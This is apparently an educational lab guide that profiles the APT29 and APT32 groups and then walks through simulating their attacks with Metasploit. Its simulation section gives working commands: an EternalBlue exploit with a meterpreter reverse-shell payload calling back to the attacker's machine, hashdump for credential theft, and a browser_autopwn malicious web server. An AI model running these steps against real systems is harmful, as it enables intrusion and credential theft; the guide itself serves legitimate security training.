# Threat Analysis Project

## Introduction
This project focuses on investigating Advanced Persistent Threat (APT) groups, documenting their tactics, techniques, and procedures (TTPs), and simulating APT attacks within a controlled lab environment. By understanding the anatomy of APT groups and emulating their attack strategies, you will gain valuable insights into threat detection and mitigation.

## Objectives
- Research and document the anatomy and tactics of selected APT groups (e.g., APT29, APT32).
- Simulate APT attack scenarios using Metasploit in the lab environment.

## Tools and Software
- Metasploit Framework
- Kali Linux
- VMware Workstation
- Vulnerable applications (e.g., DVWA, OWASP Juice Shop)

## Step 1: Research APT Groups

### APT29 (Cozy Bear)
- **Background**: APT29 is believed to be associated with Russian intelligence and is known for targeting governmental and political organizations.
- **Tactics**: 
  - **Phishing**: Use of spear-phishing emails to gain initial access.
  - **Credential Dumping**: Tools like Mimikatz to extract credentials.
  - **Remote Access**: Use of malware such as CozyDuke for persistence.
- **Mitigation Strategies**: 
  - User training on phishing awareness.
  - Implement multi-factor authentication (MFA).
  - Regular monitoring for unusual login activity.

### APT32 (Ocean Buffalo)
- **Background**: APT32 is linked to Vietnam and has targeted foreign corporations and governments, focusing on industrial espionage.
- **Tactics**: 
  - **Social Engineering**: Creating fake websites to trick users into providing sensitive information.
  - **Web Shells**: Use of web shells for command and control (C2).
  - **Data Exfiltration**: Use of encrypted channels for data exfiltration.
- **Mitigation Strategies**: 
  - Regular security assessments and penetration testing.
  - Network segmentation to limit lateral movement.
  - Endpoint detection and response (EDR) solutions.

## Step 2: Simulate APT Attacks

### Environment Setup
1. **Ensure the Lab Environment is Running**:
   - Make sure all VMs (Kali Linux, Windows, etc.) are powered on and networked correctly.
  
### Step 2.1: Using Metasploit to Emulate APT29 Attack
1. **Open Metasploit**:
   - Launch Kali Linux and open a terminal.
   - Start Metasploit: `msfconsole`.

2. **Search for an Exploit**:
   - Use the search command to find relevant exploits. For example:
     ```
     search type:exploit platform:windows
     ```

3. **Select an Exploit**:
   - Choose an appropriate exploit. For example, if you find an exploit for a vulnerable version of a service running on the target:
     ```
     use exploit/windows/smb/ms17_010_eternalblue
     ```

4. **Configure the Exploit**:
   - Set the target and payload:
     ```
     set RHOSTS [Target IP Address]
     set PAYLOAD windows/x64/meterpreter/reverse_tcp
     set LHOST [Your Kali IP Address]
     ```

5. **Execute the Exploit**:
   - Run the exploit:
     ```
     exploit
     ```

6. **Post-Exploitation**:
   - Once you gain access, use Meterpreter commands to explore the system:
     ```
     sysinfo
     hashdump
     ```

### Step 2.2: Simulating APT32 Attack
1. **Use Metasploit to Create a Social Engineering Attack**:
   - Choose an appropriate module for social engineering, such as creating a phishing page:
     ```
     use auxiliary/server/browser_autopwn
     ```

2. **Configure the Attack**:
   - Set the appropriate options:
     ```
     set SRVHOST [Your Kali IP Address]
     set URIPATH [malicious path]
     ```

3. **Launch the Attack**:
   - Start the server to host the phishing page:
     ```
     exploit
     ```

4. **Document the Attack**:
   - Document the process and findings, noting the techniques used and any access obtained.

## Conclusion
This project demonstrates the importance of understanding APT groups and their attack methodologies. By researching APT29 and APT32, and simulating attacks using Metasploit, you gain practical experience in threat analysis and incident response. Documenting these findings not only enhances your skills but also provides valuable insights into developing effective security measures against APT threats.
